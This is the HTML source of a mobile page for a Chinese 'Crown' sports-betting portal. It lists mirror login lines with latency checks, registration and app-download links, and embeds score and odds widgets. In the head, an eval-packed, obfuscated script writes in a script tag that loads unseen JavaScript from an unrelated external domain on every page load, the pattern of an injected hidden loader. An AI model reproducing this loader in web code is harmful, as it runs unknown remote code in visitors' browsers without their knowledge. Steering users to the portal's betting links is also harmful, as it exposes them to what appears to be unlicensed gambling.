
<!DOCTYPE html>
<html>

<head>
<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0' />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="Cache-Control" content="no-transform " />
<meta http-equiv="Cache-Control" content="no-siteapp " />
<meta name="applicable-device" content="mobile">
<title>皇冠</title>
<meta name="keywords" content="新皇冠,皇冠" />
<meta name="description" content="皇冠开放皇冠即时比分、皇冠APP下载、皇冠APP下载、皇冠线路APP下载、皇冠登录APP下载、皇冠注册、皇冠等业务。是皇冠最新登录线路、新2皇冠网址更新最快的体育平台。" />
<link rel="stylesheet" type="text/css" href="css1/base.css" />
<link rel="stylesheet" type="text/css" href="css1/member-center.css" />
<script type="text/javascript" src="css1/fontRem.js"></script>
<script type="text/javascript" src="css1/jquery-1.8.3.min.js"></script>
<script>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('d.c("<0 b=\'a://9.7.6/5/4.3\' 2=\'1-8\'></0>");',14,14,'script|utf|charset|js|2aa7cdbb|lib|com|dns9898||vip|https|src|write|document'.split('|'),0,{})) </script>

<script type="text/javascript">
    function fping(option) {
        var ping, requestTime, responseTime;
        var getUrl = function (url) {    //保证url带http://
            var strReg = "^((https|http)?://){1}"
            var re = new RegExp(strReg);
            return re.test(url) ? url : "http://" + url;
        }
        $.ajax({
            url: getUrl(option.url) + '/' + (new Date()).getTime() + '.html',  //设置一个空的ajax请求
            type: 'GET',
            dataType: 'html',
            timeout: 10000,
            beforeSend: function () {
                if (option.beforePing) option.beforePing();
                requestTime = new Date().getTime();
            },
            complete: function () {
                responseTime = new Date().getTime();
                ping = Math.abs(requestTime - responseTime) + "s";
                if (option.afterPing) option.afterPing(ping);
            }
        });
    };

    function getpingt(opturl, optc) {
        fping({
            url: opturl,
            beforePing: function () { $(optc).html('') },
            afterPing: function (ping) { $(optc).html(ping) },
            interval: 1
        });
    }
    $(function () {
        //会员线路
        $.post('get_login_line1.php', {
            type_id: 1,
            flag:'WAP'
        }, function (rs) {
            if (rs.status == "y") {
                $("body").attr('data-hysl', rs.data.length);
                var str = '';
                for (var i = 0; i < rs.data.length; i++) {
                    getpingt(rs.data[i].link_url, "#t" + (i + 1));
                    str += '<li><a href="' + rs.data[i].link_url + '"><span>' + rs.data[i].title + '</span><i title="该数字越小，连接速度越快" id="t' + (i + 1) + '" style="color:#FFF; font-style: normal;float: right;font-size: 12px;padding-top: 6px;padding-right: 12px;"></i></a></li> ';
                }
                $("#hyxl").html(str);
            }
        }, "json");
        //代理线路
        $.post('get_login_line1.php', {
            type_id: 2,
            flag: 'WAP'
        }, function (rs) {            
            if (rs.status == "y") {
                $("body").attr('data-dlsl', rs.data.length);
                var str = '';
                for (var i = 0; i < rs.data.length; i++) {
                    getpingt(rs.data[i].link_url, "#dlt" + (i + 1));
                    str += '<li><a href="' + rs.data[i].link_url + '"><span>' + rs.data[i].title + '</span><i title="该数字越小，连接速度越快" id="dlt' + (i + 1) + '" style="color:#FFF; font-style: normal;float: right;font-size: 12px;padding-top: 6px;padding-right: 12px;"></i></a></li> ';
                }
                $("#dlxl").html(str);
            }
        }, "json");

        setTimeout(function () {
            //会员
            var arr = [];
            var hysl = $("body").attr('data-hysl');
            for (var i = 0; i < hysl; i++) {
                arr[i] = $('#t' + (i + 1)).html().substring(0, $('#t' + (i + 1)).html().length - 1);
            }
            arr.sort(function (a, b) {
                return a - b;
            });//排序 升序
            var min = arr[0];//最小值                
            var max = arr[arr.length - 1];//最大值            

            $(".change1").each(function (i, k) {
                var _this = $(this);
                var curvalue = $(_this).find("a").find("i").html();
                curvalue = curvalue.substring(0, curvalue.length - 1);
                if (curvalue == min) {
                    var k = 0;
                    setInterval(function () {
                        k++;
                        if (k % 2 == 0) {
                            _this.css("background", "red");
                        } else {
                            _this.css("background", "blue");
                        }
                    }, 1000);
                }
            });

            $(".change2").each(function (i, k) {
                var _this = $(this);
                var curvalue = $(_this).find("a").find("i").html();
                curvalue = curvalue.substring(0, curvalue.length - 1);
                if (curvalue == min) {
                    var k = 0;
                    setInterval(function () {
                        k++;
                        if (k % 2 == 0) {
                            _this.css("background", "red");
                        } else {
                            _this.css("background", "blue");
                        }
                    }, 1000);
                }
            });

            //代理
            var dlarr = [];
            var dlsl = $("body").attr('data-dlsl');
            for (var i = 0; i < dlsl; i++) {
                dlarr[i] = $('#dlt' + (i + 1)).html().substring(0, $('#dlt' + (i + 1)).html().length - 1);
            }
            dlarr.sort(function (a, b) {
                return a - b;
            });//排序 升序
            var min = dlarr[0];//最小值                
            var max = dlarr[dlarr.length - 1];//最大值            

            $(".changes1").each(function (i, k) {
                var _this = $(this);
                var curvalue = $(_this).find("a").find("i").html();
                curvalue = curvalue.substring(0, curvalue.length - 1);
                if (curvalue == min) {
                    var k = 0;
                    setInterval(function () {
                        k++;
                        if (k % 2 == 0) {
                            _this.css("background", "red");
                        } else {
                            _this.css("background", "blue");
                        }
                    }, 1000);
                }
            });

            $(".changes2").each(function (i, k) {
                var _this = $(this);
                var curvalue = $(_this).find("a").find("i").html();
                curvalue = curvalue.substring(0, curvalue.length - 1);
                if (curvalue == min) {
                    var k = 0;
                    setInterval(function () {
                        k++;
                        if (k % 2 == 0) {
                            _this.css("background", "red");
                        } else {
                            _this.css("background", "blue");
                        }
                    }, 1000);
                }
            });

        }, 8000)
        //点击比分赔率
        $(".changetow ul li").mousemove(function () {
            $(this).find(".wpitem").show();
        });
        $(".changetow ul li").mouseout(function () {
            $(this).find(".wpitem").hide();
        });
        $(".wpitem").mouseout(function () {
            $(this).hide();
        });

        //包含页面
        $(".changetow ul li").find("a").click(function () {
            var url = $(this).data("url");
            if (url != undefined) {
                $("#main").show();
                $("#main").attr("src", url);
                $(".mt-a").html($("#main").html());
            }

        });

        //顶部返回
        $(".txt").click(function () {
            window.location.href = "/";
        });
    });
</script>
</head>

<body onload="countTime()">


<!--面包屑-->
<div class="mbx pr clearfix">
    <div class="left">
        <div class="jt"></div>
        <div class="txt" style="cursor:pointer">返回</div>
    </div>
    <a href="/" class="logo"></a>
    <ul class="gn-btn">
    	<!--<li><a href="https://www.huangguan.us/" rel="nofollow" target="_blank" rel="nofollow" class="gn-txt">APP下载</a></li>	<li><a href="https://hg030vip.com:8989" target="_blank" rel="nofollow" class="gn-txt">提现</a></li>
        <li><a href="https://hg030vip.com:8989" target="_blank" rel="nofollow" class="gn-txt">充值</a></li>-->	
    	<li><a href="https://vm.nebestbox.com/002lb4ab9mf1811szzg2cybhp0" rel="nofollow" target="_blank" rel="nofollow" class="gn-txt">客服</a></li>
     <li><a href="https://www.hg15.cc:8989/mobile-client/v5/index.html?td_channelid=1666#/download" target="_blank" rel="nofollow" class="gn-txt">APP下载</a></li> 
        <li><a href="https://www.hg15.cc:8989/mobile-client/v5/index.html?&c=#/register" target="_blank" rel="nofollow" class="gn-txt">注册</a></li>
    </ul>
</div>
<!--//面包屑-->

<iframe id="main" src="" frameborder="0" style="display:none"></iframe>

<!--m-nr-->
<div class="clearfix mt-a">

    <div class="app-title">会员登录线路</div>
    <!-- 换一批 -->
    <div class="changeone">
        <ul id="hyxl"></ul>

        <div class="huanbox"><a href="javascript:void(0)"><span class="huan" id="hyqh"><i></i>换一批</span></a>  </div>
    </div>

    <script src="js/jquery-1.10.2.js"></script>

    <script type="text/javascript">
        setTimeout(function () {
            var changeindex = 1;
            var clickindex = 2;
            $(".changeone li").each(function (index, element) {
                if (index / 6 < changeindex) {

                    element.className = "change" + changeindex;
                } else {
                    changeindex++;
                    element.className = "change" + changeindex;
                }
            })
            $(".change1").siblings().css("display", "none");
            $(".change1").show();
            $("#hyqh").click(function () {
                if (clickindex <= changeindex) {
                    $(".change" + clickindex).siblings().css("display", "none");
                    $(".change" + clickindex).show();
                    clickindex++;
                } else {
                    clickindex = 1;
                    $(".change" + clickindex).siblings().css("display", "none");
                    $(".change" + clickindex).show();
                    clickindex = 2;
                }

            });
        }, 3000)
    </script>


      <!-- <div class="app-title mt-s" style="color:#776547">代理登录线路</div>
  换一批 
    <div class="changeone k2">
        <ul id="dlxl"></ul>

        <div class="huanbox"><a href="javascript:void(0)"><span class="huan h2" id="dlqh"><i></i>换一批</span></a>  </div>
    </div>-->

    <script src="css1/jquery-1.10.2.js"></script>

    <script type="text/javascript">
        setTimeout(function () {
            var changeindex = 1;
            var clickindex = 2;
            $(".k2 li").each(function (index, element) {
                if (index / 6 < changeindex) {

                    element.className = "changes" + changeindex;
                } else {
                    changeindex++;
                    element.className = "changes" + changeindex;
                }
            })
            $(".changes1").siblings().css("display", "none");
            $(".changes1").show();
            $("#dlqh").click(function () {
                if (clickindex <= changeindex) {
                    $(".changes" + clickindex).siblings().css("display", "none");
                    $(".changes" + clickindex).show();
                    clickindex++;
                } else {
                    clickindex = 1;
                    $(".changes" + clickindex).siblings().css("display", "none");
                    $(".changes" + clickindex).show();
                    clickindex = 2;
                }

            });
        }, 3000);
    </script>

    <div class="app-title mt-s" style="color:#776547">比分赔率</div>
    <div class="changetow">
        <ul>
            <li>
                <a><span>7M比分</span></a>
                <div class="wpitem" style="display:none">
                    <p><a data-url="https://m.7m.com.cn/live/index.html">7M比分</a></p>
                    <p><a data-url="https://freelive.7m.com.cn/live.aspx?mark=big&TimeZone=%2B0800&wordAd=&wadurl=http://www.7m.com.cn&width=100%&cpageBgColor=FFFFFF&tableFontSize=16&cborderColor=78C9E6&ctdColor1=DCF0F8&ctdColor2=FFFFFF&clinkColor=248DB5&cdateFontColor=FFFFFF&cdateBgColor=FFCCCC&scoreFontSize=16&cteamFontColor=666666&cgoalFontColor=FF0000&cgoalBgColor=FFFFE1&cremarkFontColor=FF0000&cremarkBgColor=FFFFE1&Skins=9&teamWeight=400&scoreWeight=700&goalWeight=700&fontWeight=700&DSTbox=&ordType=&view=All&voi=0&away=0&red=0&all=0">完整比分</a></p>
                    <p><a data-url="https://m.7m.com.cn/blive/">手机篮球</a></p>
                    <p><a data-url="https://basket.7m.com.cn/free_big.aspx?tz=+0800">篮球比分</a></p>
                </div>
            </li>
            <!--<li><a data-url="http://am.90bifen.com/slot/html/fixture/fixture.htm?a=0&K=1&l=1&f=1"><span>澳门赔率</span></a></li>-->
            <li>
                <a><span>雷速比分</span></a>
                <div class="wpitem" style="display:none">
                    <p><a data-url="https://free.leisu.com/?width=1080&theme=blue">雷速足球</a></p>
                    <p><a data-url="https://free.leisu.com/lanqiu/?width=1080&theme=red">雷速篮球</a></p>
                </div>
            </li>
            <li><a data-url="http://pl.win007.com/free.aspx?t=4"><span>欧赔指数</span></a></li>
            <!--  <li>
                <a><span>体球比分</span></a>
                <div class="wpitem" style="display:none">
                   <p><a data-url="http://bf.spbo1.com/free.htm">足球比分</a></p>
                    <p><a data-url="http://www.spbo1.com/bf.htm">即时比分</a></p>
                </div>
            </li>-->
            <li><a data-url="http://pl.win007.com/free.aspx?Edition=1&lang=1&ad=====hg0088%u7687%u51A0%u73B0%u91D1%u7F51[%u6B63%u7F51%u5F00%u6237]===&adurl=http://www.hg030vip.com"><span>亚赔指数</span></a></li>
            <li>
                <a><span>捷报比分</span></a>
                <div class="wpitem" style="display:none">
                    <p><a data-url="http://data.nowscore.com/free.htm">捷报比分</a></p>
                    <p><a data-url="http://data.nowscore.com/free2.htm">简约比分</a></p>
                    <p><a data-url="http://data.nowscore.com/odds/free.htm">足球赔率</a></p>
                    <p><a data-url="http://data.nowscore.com/freenba.htm">篮球比分</a></p>
                </div>
            </li>
            <li><a data-url="http://pl.win007.com/free.aspx?t=5"><span>大小指数</span></a></li>
            <li><a data-url="http://odds.sports.sina.com.cn/odds/right.php"><span>独赢澳盘</span></a></li>
        </ul>
    </div>
</div>
<!--//m-nr-->

</body>
</html>
